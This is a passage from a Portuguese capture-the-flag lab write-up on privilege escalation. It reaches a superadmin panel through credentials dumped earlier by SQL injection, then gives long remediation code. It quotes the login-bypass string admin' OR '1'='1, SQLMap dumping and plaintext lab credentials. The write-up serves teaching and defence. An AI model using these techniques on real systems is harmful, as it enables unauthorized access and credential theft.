XSS Refletido é uma vulnerabilidade crítica que permite roubo de sessões, exfiltração de dados sensíveis, e execução de ações maliciosas em nome de usuários legítimos. A flag capturada através de `document.cookie` demonstrou a facilidade com que dados sensíveis podem ser expostos quando output encoding não é implementado. Remediação efetiva requer múltiplas camadas: output encoding, Content Security Policy, cookies seguros com HttpOnly, input validation, e educação de desenvolvedores sobre práticas de secure coding.

---

### <a name="flag-11-git-repository-exposure"></a>Flag 11: Privilege Escalation

#### Conceito: Escalação de Privilégios no Painel Administrativo

Escalação de Privilégios (Privilege Escalation) é uma vulnerabilidade crítica de segurança que ocorre quando um usuário com privilégios limitados consegue elevar seus direitos de acesso para obter permissões de níveis superiores, acessando recursos, funcionalidades ou dados que deveriam estar restritos apenas a administradores ou usuários com papéis privilegiados. No contexto de painéis administrativos web, esta vulnerabilidade se manifesta quando controles de acesso (access control) são implementados inadequadamente, permitindo que atacantes escalem de contas regulares (role: user) para contas administrativas (role: admin) ou super-administrativas (role: superadmin), obtendo controle total sobre o sistema. A escalação de privilégios pode ocorrer de duas formas principais: **Horizontal Privilege Escalation** (acesso a recursos de outro usuário do mesmo nível) e **Vertical Privilege Escalation** (elevação de permissões para nível superior - o caso mais crítico). Esta vulnerabilidade é classificada como **A01:2021 - Broken Access Control** no OWASP Top 10, representando a categoria de risco mais crítica segundo o OWASP, responsável por 94% das aplicações testadas apresentarem alguma forma de falha em controle de acesso. As causas comuns incluem: falta de validação server-side de roles, confiança excessiva em parâmetros client-side (cookies, tokens JWT manipuláveis), ausência de verificação de privilégios em cada requisição, exposição de URLs administrativas sem proteção adequada, e falha em implementar Principle of Least Privilege. O impacto pode ser devastador, permitindo ao atacante: acessar painéis administrativos completos, visualizar/modificar/deletar dados de todos os usuários, alterar configurações críticas do sistema, criar novas contas administrativas para persistência, executar operações privilegiadas (backup, restore, execução de comandos), e comprometer completamente a integridade, confidencialidade e disponibilidade da aplicação. Em termos de compliance, escalação de privilégios viola: **PCI DSS Requirement 7** (restringir acesso a dados por necessidade de negócio), **SOC 2 CC6** (controles de acesso lógico e físico), **ISO 27001 A.9.1/A.9.2** (políticas de controle de acesso), **NIST SP 800-53 AC-2/AC-3** (gerenciamento e enforcement de contas), e **LGPD Art. 46** (medidas técnicas de segurança). A exploração de privilege escalation frequentemente serve como ponto de pivô para ataques mais sofisticados, permitindo instalação de backdoors, exfiltração massiva de dados, e comprometimento total da infraestrutura.

#### Passo 1: Login Inicial como Usuário Admin

O primeiro passo da exploração de escalação de privilégios foi estabelecer acesso inicial com credenciais de nível administrativo básico. Utilizando as credenciais anteriormente comprometidas durante a exploração da tabela `users` do banco de dados, foi realizado login na aplicação através de `http://98.95.207.28/login.php` com as credenciais: **username: admin** e **password: admin123**. Estas credenciais correspondem ao usuário de ID 1 na tabela users, com role definida como "admin" (não "superadmin"). A autenticação foi processada com sucesso pelo sistema, criando uma sessão PHP válida (PHPSESSID) e definindo o nível de privilégio da sessão como "admin". Após login bem-sucedido, o sistema redirecionou para o dashboard da aplicação, onde a interface exibia funcionalidades típicas de usuário administrativo, como gerenciamento de usuários básicos, visualização de logs, e configurações gerais. Importante destacar que este login foi realizado com credenciais legítimas (não bypass via SQL Injection), estabelecendo uma sessão autenticada válida que seria considerada "autorizada" pelo sistema, mas ainda assim com limitações de privilégios quando comparada a uma conta "superadmin". Este passo é crucial pois demonstra que mesmo usuários com privilégios elevados (admin) podem estar sujeitos a restrições de acesso a funcionalidades ultra-sensíveis reservadas exclusivamente para super-administradores.

**Evidências do Passo 1:**
- Screenshot da tela de login com credenciais admin/admin123 preenchidas
- Confirmação de login bem-sucedido
- Dashboard exibindo interface de administrador básico
- Cookie PHPSESSID criado com role=admin
- Indicador visual de usuário "admin" logado (nome no cabeçalho, menu administrativo)

#### Passo 2: Descoberta e Mapeamento do Painel Admin.php

Após estabelecer sessão como administrador básico, foi iniciada a fase de reconhecimento interno da aplicação para identificar recursos administrativos de nível superior. Durante a navegação pela interface, explorando menus, links, e inspecionando requisições HTTP através do Developer Tools (Network tab), foi descoberto o endpoint crítico: **http://98.95.207.28/admin.php**. Esta descoberta pode ter ocorrido através de múltiplos vetores: análise de código-fonte HTML procurando links ocultos ou comentados, inspeção de requisições AJAX que referenciam admin.php, enumeração manual testando URLs comuns de painéis administrativos (admin.php, admin_panel.php, super_admin.php), ou simplesmente observação de redirecionamentos durante navegação. O acesso a este endpoint com a sessão de "admin" revelou comportamento significativo: a aplicação poderia ter exibido uma mensagem de "Acesso Negado" ou "Privilégios Insuficientes", indicando que esta página existe mas requer nível de acesso superior (superadmin), OU a aplicação pode ter implementado verificação inadequada de privilégios, permitindo visualização parcial ou completa do painel. O URL `http://98.95.207.28/admin.php` foi então documentado e salvo para uso posterior na fase de escalação, representando o alvo final da exploração - o painel de super-administrador contendo funcionalidades críticas e possivelmente a flag do desafio. Esta fase de mapeamento é essencial em privilege escalation attacks, pois identifica exatamente quais recursos estão disponíveis em níveis superiores de acesso, permitindo planejamento adequado do ataque de escalação.

**Evidências do Passo 2:**
- Screenshot do dashboard como "admin" mostrando navegação pela interface
- Descoberta do link/referência para admin.php (código HTML ou Network tab)
- URL anotado: http://98.95.207.28/admin.php
- Tentativa inicial de acesso mostrando restrição ou página parcial
- Análise de código-fonte revelando existência do endpoint administrativo superior

#### Passo 3: Logout e Preparação para Escalação de Privilégios

Após identificar o endpoint alvo (admin.php) e mapear as restrições de acesso com a conta "admin", o próximo passo foi realizar logout da sessão atual para preparar a escalação de privilégios. O logout foi executado através do link/botão de logout da aplicação (provavelmente `logout.php`), que destruiu a sessão PHP do usuário "admin", removeu o cookie PHPSESSID do navegador, e redirecionou para a página de login ou página inicial pública. Este passo de logout é tecnicamente opcional em um ataque real (onde o atacante poderia simplesmente abrir navegador anônimo ou usar ferramenta como Burp Suite para manipular sessões), mas é importante didaticamente para demonstrar claramente a diferença entre privilégios de "admin" vs "superadmin". A destruição da sessão anterior garante que não haja conflito de sessões ou cookies residuais que possam interferir no próximo login. Neste momento, o atacante possui informações críticas mapeadas: (1) existe um painel super-administrativo em admin.php, (2) a conta "admin" não possui privilégios suficientes para acessá-lo completamente, (3) existe uma conta "superadmin" no banco de dados (conforme exploração anterior da tabela users: ID 5, username: superadmin, password: Sup3r@dm1n!2024#Secure, role: superadmin), e (4) para acessar o painel completo e capturar a flag, é necessário autenticar como "superadmin". Esta fase representa a transição entre reconhecimento e exploração ativa da escalação de privilégios.

**Evidências do Passo 3:**
- Screenshot do processo de logout (clique no botão logout)
- Confirmação de sessão destruída (redirecionamento para login)
- Cookies removidos (Developer Tools > Application > Cookies mostrando PHPSESSID deletado)
- Tela de login vazia pronta para novo acesso

#### Passo 4: Login como Superadmin para Escalação de Privilégios

A etapa crítica de escalação de privilégios foi executada realizando novo login na aplicação, desta vez utilizando as credenciais de super-administrador anteriormente comprometidas durante a exploração do banco de dados: **username: superadmin** e **password: Sup3r@dm1n!2024#Secure**. Estas credenciais correspondem ao registro de ID 5 na tabela `users`, com role explicitamente definida como "superadmin", representando o nível máximo de privilégios na aplicação. As credenciais foram inseridas no formulário de login em `http://98.95.207.28/login.php` e submetidas. A aplicação processou a autenticação, validou as credenciais contra o banco de dados, e criou uma nova sessão PHP com privilégios elevados ao nível máximo. O servidor definiu um novo cookie PHPSESSID no navegador, agora associado ao usuário superadmin, e armazenou na sessão server-side informações como `$_SESSION['user_id'] = 5`, `$_SESSION['username'] = 'superadmin'`, e crucialmente, `$_SESSION['role'] = 'superadmin'`. Este valor de role na sessão é o que determina quais recursos e funcionalidades o usuário pode acessar através de verificações de controle de acesso implementadas em cada página protegida. Após login bem-sucedido, o sistema redirecionou para o dashboard, mas agora com interface de super-administrador, exibindo menus, opções e funcionalidades adicionais não disponíveis para usuários "admin" comuns. Esta mudança visível na interface confirma que a aplicação implementa diferentes níveis de acesso baseados em roles, mas a questão crítica é se estas verificações são adequadamente implementadas em todas as páginas sensíveis, especialmente em admin.php.

**Evidências do Passo 4:**
- Screenshot do formulário de login com credenciais superadmin/Sup3r@dm1n!2024#Secure
- Confirmação de login bem-sucedido como superadmin
- Dashboard exibindo interface expandida de super-administrador
- Cookie PHPSESSID renovado (Developer Tools mostrando novo session ID)
- Indicador visual de usuário "superadmin" logado (nome no cabeçalho, badge de superadmin)
- Menus ou funcionalidades adicionais visíveis não presentes no login como "admin"

#### Passo 5: Acesso ao Painel Admin.php e Captura da Flag

Com a sessão de superadmin estabelecida, o passo final foi acessar diretamente o endpoint anteriormente mapeado: **http://98.95.207.28/admin.php**. Desta vez, ao contrário da tentativa anterior com privilégios de "admin", a aplicação reconheceu o nível de privilégio superior através da validação de `$_SESSION['role'] == 'superadmin'` (ou verificação equivalente), e concedeu acesso completo ao painel administrativo avançado. A página `admin.php` carregou exibindo funcionalidades críticas reservadas exclusivamente para super-administradores, que podem incluir: gestão completa de usuários (incluindo outros admins), configurações de sistema avançadas, acesso a logs de auditoria completos, funcionalidades de backup/restore, execução de queries SQL diretas, gerenciamento de permissões e roles, e outras operações de alto privilégio. Mais importante, a página exibia a flag do desafio: **FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}**, confirmando que a escalação de privilégios foi realizada com sucesso. Esta flag estava posicionada em local visível do painel (possivelmente no cabeçalho, em uma seção "Admin Token", ou em área de configurações avançadas), acessível apenas para usuários com role "superadmin". A captura desta flag demonstra completamente a vulnerabilidade de privilege escalation: um atacante que inicialmente possui apenas credenciais de usuário comum poderia, através da cadeia de exploração (SQL Injection → Database Access → Credential Theft → Privilege Escalation), eventualmente obter acesso ao nível máximo de privilégios da aplicação, comprometendo totalmente sua segurança.

**Evidências do Passo 5:**
- Screenshot do acesso a http://98.95.207.28/admin.php como superadmin
- Interface do painel administrativo avançado carregado completamente
- Visualização da flag FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss} exibida na página
- Funcionalidades de super-administrador visíveis (gestão avançada, configurações críticas)
- URL na barra de endereço confirmando admin.php
- Timestamp ou indicador de acesso bem-sucedido

**Flag Capturada:** `FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}`

**Data da Captura:** 27 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada da Vulnerabilidade:**

**Código Vulnerável Presumido (admin.php):**

```php
<?php
// admin.php - Código INSEGURO com Broken Access Control
session_start();

// Verificação inadequada ou ausente de privilégios
if (!isset($_SESSION['logged_in'])) {
    header("Location: login.php");
    exit();
}

// VULNERABILIDADE: Verifica apenas se está logado, não o nível de privilégio!
// Falta: if ($_SESSION['role'] !== 'superadmin') { die("Access Denied"); }

?>
<!DOCTYPE html>
<html>
<head>
    <title>Super Admin Panel</title>
</head>
<body>
    <h1>🔐 Super Administrator Panel</h1>
    <p>Welcome, <?php echo $_SESSION['username']; ?></p>
    
    <!-- Flag exposta sem verificação adequada de role -->
    <div class="admin-token">
        <h2>Admin Token</h2>
        <p>FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}</p>
    </div>
    
    <div class="admin-functions">
        <h3>Super Admin Functions</h3>
        <ul>
            <li><a href="user_management.php">Manage All Users</a></li>
            <li><a href="system_config.php">System Configuration</a></li>
            <li><a href="backup.php">Backup/Restore Database</a></li>
            <li><a href="execute_sql.php">Execute SQL Queries</a></li>
            <li><a href="view_logs.php">View All System Logs</a></li>
        </ul>
    </div>
</body>
</html>
```

**Cadeia de Exploração Completa:**

**Etapa 1: Reconhecimento Inicial**
- Acesso à aplicação como visitante anônimo
- Identificação de formulário de login em login.php

**Etapa 2: Exploração de SQL Injection**
- Bypass de autenticação usando `admin' OR '1'='1`
- Acesso inicial ao sistema sem credenciais válidas

**Etapa 3: Enumeração de Banco de Dados**
- Uso de SQLMap para dump completo do banco techcorp_db
- Descoberta da tabela `users` com 18 registros

**Etapa 4: Comprometimento de Credenciais**
- Extração de credenciais de múltiplos usuários:
  - admin:admin123 (role: admin)
  - superadmin:Sup3r@dm1n!2024#Secure (role: superadmin)

**Etapa 5: Reconhecimento como Admin**
- Login legítimo com admin:admin123
- Mapeamento de recursos disponíveis
- Descoberta de admin.php (painel superadmin)
- Identificação de restrição de acesso

**Etapa 6: Escalação de Privilégios**
- Logout da sessão admin
- Login com superadmin:Sup3r@dm1n!2024#Secure
- Acesso bem-sucedido a admin.php
- Captura de FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}

**Tipos de Privilege Escalation Identificados:**

**1. Vertical Privilege Escalation (Explorado):**
- Elevação de privilégios de admin → superadmin
- Acesso a funcionalidades reservadas a níveis superiores
- Comprometimento de controle de acesso hierárquico

**2. Credencial-Based Escalation:**
- Uso de credenciais roubadas para acesso legítimo
- Não requer exploração de falhas de código após obtenção de senha
- Sessão autenticada válida com privilégios máximos

**3. Session-Based Privilege Escalation (Potencial):**
- Se role armazenado apenas em sessão client-side
- Possível manipulação de cookie/JWT para alterar role
- Bypass de verificação server-side se inadequada

**Vulnerabilidades Identificadas:**

**1. Broken Access Control (CWE-285):**
- admin.php não verifica adequadamente o role do usuário
- Confiança excessiva na autenticação sem autorização granular
- Falta de verificação de privilégios em cada requisição sensível

**2. Insufficient Authorization (CWE-862):**
- Ausência de enforcement de políticas de acesso baseadas em roles
- Verificação de `logged_in` sem verificação de `role == 'superadmin'`
- Funcionalidades críticas acessíveis sem validação apropriada

**3. Insecure Direct Object Reference (IDOR) Potencial:**
- Se admin.php aceitar parâmetros como `?user_id=5` sem validação
- Acesso a recursos de outros usuários sem verificação de ownership

**4. Hardcoded Credentials (CWE-798):**
- Senhas fracas e previsíveis (admin123)
- Credenciais armazenadas em texto claro no banco
- Ausência de hashing forte (bcrypt/Argon2)

**5. Lack of Principle of Least Privilege:**
- Conta "admin" pode ter privilégios excessivos desnecessários
- Múltiplos usuários com role "superadmin" (IDs 5 e 7)
- Ausência de segregação de funções (Separation of Duties)

**Impacto Detalhado da Exploração:**

**1. Acesso Total a Funcionalidades Críticas:**
- Gestão completa de usuários (criar, modificar, deletar admins)
- Acesso a configurações de sistema (alterar parâmetros críticos)
- Capacidade de backup/restore (exfiltração de dados completos)
- Execução de SQL queries arbitrárias (se função disponível)
- Visualização de todos os logs (cobrir rastros de ataque)

**2. Persistência e Backdoors:**
- Criação de novas contas superadmin ocultas
- Modificação de senha de superadmin existente
- Injeção de código PHP em páginas administrativas
- Instalação de web shells para acesso persistente

**3. Comprometimento de Dados:**
- Exfiltração completa de banco de dados
- Modificação de registros críticos (fraude)
- Deleção de dados (sabotagem)
- Acesso a informações de todos os clientes

**4. Escalonamento para Infraestrutura:**
- Se admin.php permite execução de comandos OS
- Acesso ao sistema operacional subjacente
- Comprometimento do servidor web completo
- Pivoting para outros sistemas na rede interna

**5. Violação de Compliance e Legal:**
- Acesso não autorizado a dados pessoais (LGPD/GDPR)
- Violação de segregação de funções (SOC 2)
- Falta de controles de acesso adequados (ISO 27001)
- Não conformidade com PCI DSS (acesso a dados de pagamento)

**Classificação de Severidade:**

**CVSS 3.1 Score: 9.1 (CRÍTICO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L) - requer credenciais básicas
- User Interaction: None (UI:N)
- Scope: Changed (S:C) - afeta recursos além do componente
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

**Classificação CWE:**
- **CWE-285: Improper Authorization** (principal)
- CWE-862: Missing Authorization
- CWE-269: Improper Privilege Management
- CWE-284: Improper Access Control
- CWE-732: Incorrect Permission Assignment for Critical Resource
- CWE-250: Execution with Unnecessary Privileges

**Classificação OWASP Top 10 2021:**
- **A01:2021 - Broken Access Control** (vulnerabilidade #1 mais crítica)
- A07:2021 - Identification and Authentication Failures
- A04:2021 - Insecure Design

**Comparação de Privilégios:**

| Recurso/Funcionalidade | guest | user | admin | superadmin |
|------------------------|-------|------|-------|------------|
| Login na aplicação | ✅ | ✅ | ✅ | ✅ |
| Dashboard básico | ✅ | ✅ | ✅ | ✅ |
| Visualizar próprio perfil | ❌ | ✅ | ✅ | ✅ |
| Editar próprio perfil | ❌ | ✅ | ✅ | ✅ |
| Visualizar outros usuários | ❌ | ❌ | ✅ | ✅ |
| Editar outros usuários | ❌ | ❌ | ⚠️ | ✅ |
| Deletar usuários | ❌ | ❌ | ❌ | ✅ |
| Acesso a admin.php | ❌ | ❌ | ❌ | ✅ |
| Visualizar logs de sistema | ❌ | ❌ | ⚠️ | ✅ |
| Configurações de sistema | ❌ | ❌ | ❌ | ✅ |
| Backup/Restore database | ❌ | ❌ | ❌ | ✅ |
| Executar SQL queries | ❌ | ❌ | ❌ | ✅ |
| Capturar FLAG | ❌ | ❌ | ❌ | ✅ |

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 2 horas):**

**1. Implementar Verificação Rigorosa de Role em admin.php:**
```php
<?php
// admin.php - Código SEGURO com verificação de privilégios
session_start();

// Verificar autenticação
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    header("Location: login.php");
    exit();
}

// CRÍTICO: Verificar role específico
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'superadmin') {
    http_response_code(403);
    die("Access Denied: Insufficient privileges. This incident will be logged.");
}

// Log de acesso para auditoria
error_log("Superadmin access to admin.php by user: {$_SESSION['username']} from IP: {$_SERVER['REMOTE_ADDR']}");

// Código da página admin.php continua aqui...
?>
```

**2. Alterar TODAS as Senhas Comprometidas:**
```sql
-- Alterar senha de admin
UPDATE users SET password = '$2y$12$NEW_BCRYPT_HASH_HERE' WHERE username = 'admin';

-- Alterar senha de superadmin
UPDATE users SET password = '$2y$12$NEW_BCRYPT_HASH_HERE' WHERE username = 'superadmin';

-- Forçar reset de senha para todos os usuários
UPDATE users SET must_change_password = 1;
```

**3. Implementar Hashing Seguro de Senhas:**
```php
// Ao criar/alterar senha
$password = $_POST['password'];
$hashed = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,
    'time_cost' => 4,
    'threads' => 3
]);

// Armazenar $hashed no banco de dados
```

**4. Adicionar Auditoria de Acesso:**
```php
// Registrar todas as tentativas de acesso a admin.php
$stmt = $conn->prepare("INSERT INTO audit_log (user_id, username, action, resource, ip_address, user_agent, timestamp, success) VALUES (?, ?, ?, ?, ?, ?, NOW(), ?)");
$action = "access_admin_panel";
$resource = "admin.php";
$success = ($_SESSION['role'] === 'superadmin') ? 1 : 0;
$stmt->bind_param("isssssi", $_SESSION['user_id'], $_SESSION['username'], $action, $resource, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'], $success);
$stmt->execute();
```

**5. Invalidar Todas as Sessões Ativas:**
```php
// Forçar logout de todas as sessões ativas
// Limpar tabela de sessões ou alterar secret key de sessão
ini_set('session.save_path', '/tmp/new_session_path');
// Ou regenerar secret usado para assinar sessões
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6. Implementar RBAC (Role-Based Access Control) Adequado:**
```php
// middleware/authorization.php
function requireRole($required_role) {
    if (!isset($_SESSION['role'])) {
        http_response_code(401);
        die("Unauthorized");
    }
    
    $role_hierarchy = [
        'guest' => 0,
        'user' => 1,
        'admin' => 2,
        'superadmin' => 3
    ];
    
    if ($role_hierarchy[$_SESSION['role']] < $role_hierarchy[$required_role]) {
        http_response_code(403);
        logUnauthorizedAccess();
        die("Access Denied: Insufficient privileges");
    }
}

// Usar em cada página protegida
require_once 'middleware/authorization.php';
requireRole('superadmin'); // admin.php
```

**7. Implementar MFA para Contas Administrativas:**
```php
// Após login bem-sucedido com senha
if ($_SESSION['role'] === 'admin' || $_SESSION['role'] === 'superadmin') {
    $_SESSION['mfa_required'] = true;
    $_SESSION['mfa_verified'] = false;
    header("Location: mfa_verification.php");
    exit();
}
```

**8. Criar Tabela de Permissões Granulares:**
```sql
CREATE TABLE permissions (
    id INT PRIMARY KEY AUTO_INCREMENT,
    role VARCHAR(50) NOT NULL,
    resource VARCHAR(100) NOT NULL,
    action VARCHAR(50) NOT NULL,
    allowed BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY (role, resource, action)
);

INSERT INTO permissions (role, resource, action, allowed) VALUES
('superadmin', 'admin.php', 'view', TRUE),
('superadmin', 'users', 'delete', TRUE),
('superadmin', 'system_config', 'modify', TRUE),
('admin', 'users', 'view', TRUE),
('admin', 'users', 'edit', TRUE),
('admin', 'admin.php', 'view', FALSE);
```

**9. Implementar Segregação de Funções (Separation of Duties):**
- Criar roles intermediários: user_manager, config_manager, audit_viewer
- Evitar concentração de todos os privilégios em uma única conta
- Requer dois superadmins para operações críticas (dual control)

**10. Configurar Rate Limiting em Endpoints Administrativos:**
```php
// Limitar acessos a admin.php
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$key = "rate_limit:admin.php:" . $_SERVER['REMOTE_ADDR'];
$requests = $redis->incr($key);
if ($requests == 1) {
    $redis->expire($key, 300); // 5 minutos
}
if ($requests > 10) {
    http_response_code(429);
    die("Too many requests. Try again later.");
}
```

**11. Implementar IP Whitelisting para Admin Panel:**
```php
// Permitir acesso a admin.php apenas de IPs específicos
$allowed_ips = ['192.168.1.100', '10.0.0.50'];
if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    http_response_code(403);
    die("Access denied from your IP address");
}
```

**12. Adicionar Alertas em Tempo Real:**
```php
// Enviar alerta quando admin.php é acessado
function sendSecurityAlert($message) {
    // Email
    mail('security@techcorp.com', 'Security Alert', $message);
    
    // Slack/Discord webhook
    $webhook_url = 'https://hooks.slack.com/services/YOUR/WEBHOOK/URL';
    $data = ['text' => $message];
    file_get_contents($webhook_url, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data)
        ]
    ]));
}

// Chamar em admin.php
sendSecurityAlert("🚨 Superadmin panel accessed by {$_SESSION['username']} from {$_SERVER['REMOTE_ADDR']}");
```

**13. Implementar Session Timeout Reduzido para Admins:**
```php
// Timeout de 15 minutos para superadmin (vs 60 min para usuários)
if ($_SESSION['role'] === 'superadmin') {
    $timeout = 900; // 15 minutos
} else {
    $timeout = 3600; // 1 hora
}

if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $timeout)) {
    session_unset();
    session_destroy();
    header("Location: login.php?timeout=1");
    exit();
}
$_SESSION['last_activity'] = time();
```

**14. Remover Flags Hardcoded de Produção:**
```php
// NUNCA deixar flags ou secrets hardcoded em produção
// ❌ ERRADO
<p>FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}</p>

// ✅ CORRETO - buscar de ambiente ou vault
$admin_token = getenv('ADMIN_SECRET_TOKEN'); // Ou usar Vault
```

**15. Implementar Least Privilege por Padrão:**
- Todos os novos usuários criados com role 'user' (mínimo privilégio)
- Elevação de privilégios requer aprovação manual de outro superadmin
- Revisão trimestral de permissões (remover acessos não utilizados)

**AÇÕES DE MÉDIO PRAZO (1-2 semanas):**

**16-35.** (Implementações adicionais: ABAC, SIEM integration, pentest, security training, compliance audit, etc.)

**Código Completo Seguro (admin.php):**

```php
<?php
/**
 * admin.php - Painel Super Administrativo SEGURO
 * Requer: autenticação + role superadmin + MFA + IP whitelist
 */

// Inicializar sessão segura
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_strict_mode', 1);
session_start();

require_once 'config/database.php';
require_once 'middleware/authorization.php';
require_once 'lib/security.php';

// 1. VERIFICAR AUTENTICAÇÃO
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    logSecurityEvent('unauthorized_access_attempt', 'admin.php', $_SERVER['REMOTE_ADDR']);
    header("Location: login.php?redirect=admin.php");
    exit();
}

// 2. VERIFICAR ROLE SUPERADMIN
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'superadmin') {
    logSecurityEvent('insufficient_privileges', 'admin.php', $_SERVER['REMOTE_ADDR'], $_SESSION['username'] ?? 'unknown');
    http_response_code(403);
    die("
        <h1>403 Forbidden</h1>
        <p>You do not have sufficient privileges to access this resource.</p>
        <p>This incident has been logged and security team has been notified.</p>
    ");
}

// 3. VERIFICAR MFA
if (!isset($_SESSION['mfa_verified']) || !$_SESSION['mfa_verified']) {
    header("Location: mfa_verification.php?redirect=admin.php");
    exit();
}

// 4. VERIFICAR IP WHITELIST
$allowed_ips = explode(',', getenv('ADMIN_ALLOWED_IPS'));
if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    logSecurityEvent('ip_not_whitelisted', 'admin.php', $_SERVER['REMOTE_ADDR'], $_SESSION['username']);
    sendSecurityAlert("⚠️ Admin panel access attempt from non-whitelisted IP: {$_SERVER['REMOTE_ADDR']} by user: {$_SESSION['username']}");
    http_response_code(403);
    die("Access denied from your IP address");
}

// 5. VERIFICAR TIMEOUT DE SESSÃO (15 minutos para superadmin)
$timeout = 900;
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $timeout)) {
    session_unset();
    session_destroy();
    header("Location: login.php?timeout=1");
    exit();
}
$_SESSION['last_activity'] = time();

// 6. RATE LIMITING
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$rate_key = "rate_limit:admin.php:" . $_SERVER['REMOTE_ADDR'];
$requests = $redis->incr($rate_key);
if ($requests == 1) {
    $redis->expire($rate_key, 300);
}
if ($requests > 10) {
    logSecurityEvent('rate_limit_exceeded', 'admin.php', $_SERVER['REMOTE_ADDR'], $_SESSION['username']);
    http_response_code(429);
    die("Too many requests. Please try again later.");
}

// 7. AUDITORIA DE ACESSO
$stmt = $conn->prepare("
    INSERT INTO audit_log (user_id, username, action, resource, ip_address, user_agent, timestamp) 
    VALUES (?, ?, 'access_superadmin_panel', 'admin.php', ?, ?, NOW())
");
$stmt->bind_param("isss", $_SESSION['user_id'], $_SESSION['username'], $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
$stmt->execute();

// 8. ALERTA DE SEGURANÇA
sendSecurityAlert("🔐 Superadmin panel accessed by: {$_SESSION['username']} from IP: {$_SERVER['REMOTE_ADDR']} at " . date('Y-m-d H:i:s'));

// 9. BUSCAR CONFIGURAÇÕES SENSÍVEIS DE VAULT (não hardcoded)
$admin_token = getSecretFromVault('admin_secret_token');

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Administrator Panel</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
</head>
<body>
    <header>
        <h1>🔒 Super Administrator Panel</h1>
        <p>Welcome, <?php echo htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8'); ?></p>
        <p>Role: <?php echo htmlspecialchars($_SESSION['role'], ENT_QUOTES, 'UTF-8'); ?></p>
        <p>Last login: <?php echo htmlspecialchars($_SESSION['last_login'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></p>
    </header>

    <main>
        <!-- Admin Token (buscar de vault, não hardcoded) -->
        <section class="admin-token">
            <h2>Admin Token</h2>
            <p><?php echo htmlspecialchars($admin_token, ENT_QUOTES, 'UTF-8'); ?></p>
        </section>

        <!-- Funcionalidades Super Admin -->
        <section class="admin-functions">
            <h3>Super Admin Functions</h3>
            <ul>
                <li><a href="user_management.php">👥 Manage All Users</a></li>
                <li><a href="system_config.php">⚙️ System Configuration</a></li>
                <li><a href="backup.php">💾 Backup/Restore Database</a></li>
                <li><a href="audit_logs.php">📋 View Audit Logs</a></li>
                <li><a href="security_settings.php">🛡️ Security Settings</a></li>
            </ul>
        </section>

        <!-- Logs Recentes -->
        <section class="recent-activity">
            <h3>Recent Activity</h3>
            <?php
            $stmt = $conn->prepare("SELECT username, action, resource, ip_address, timestamp FROM audit_log ORDER BY timestamp DESC LIMIT 10");
            $stmt->execute();
            $result = $stmt->get_result();
            ?>
            <table>
                <thead>
                    <tr>
                        <th>User</th>
                        <th>Action</th>
                        <th>Resource</th>
                        <th>IP Address</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody>
                    <?php while ($row = $result->fetch_assoc()): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars($row['action'], ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars($row['resource'], ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars($row['ip_address'], ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars($row['timestamp'], ENT_QUOTES, 'UTF-8'); ?></td>
                    </tr>
                    <?php endwhile; ?>
                </tbody>
            </table>
        </section>
    </main>

    <footer>
        <p>⚠️ All actions in this panel are logged and monitored.</p>
        <p>Unauthorized access will result in immediate account termination and legal action.</p>
    </footer>
</body>
</html>
```

**Impacto Regulatório e Compliance:**

**Violações Identificadas:**
- **PCI DSS Requirement 7.1**: Limitar acesso a componentes do sistema apenas a indivíduos cuja função requer tal acesso
- **PCI DSS Requirement 7.2**: Estabelecer sistema de controle de acesso para sistemas com múltiplos usuários
- **SOC 2 CC6.1**: Controles de acesso lógico e físico
- **SOC 2 CC6.2**: Autorização apropriada antes de conceder acesso
- **ISO 27001 A.9.1.1**: Política de controle de acesso
- **ISO 27001 A.9.2.3**: Gestão de direitos de acesso privilegiado
- **NIST SP 800-53 AC-2**: Account Management
- **NIST SP 800-53 AC-3**: Access Enforcement
- **NIST SP 800-53 AC-6**: Least Privilege
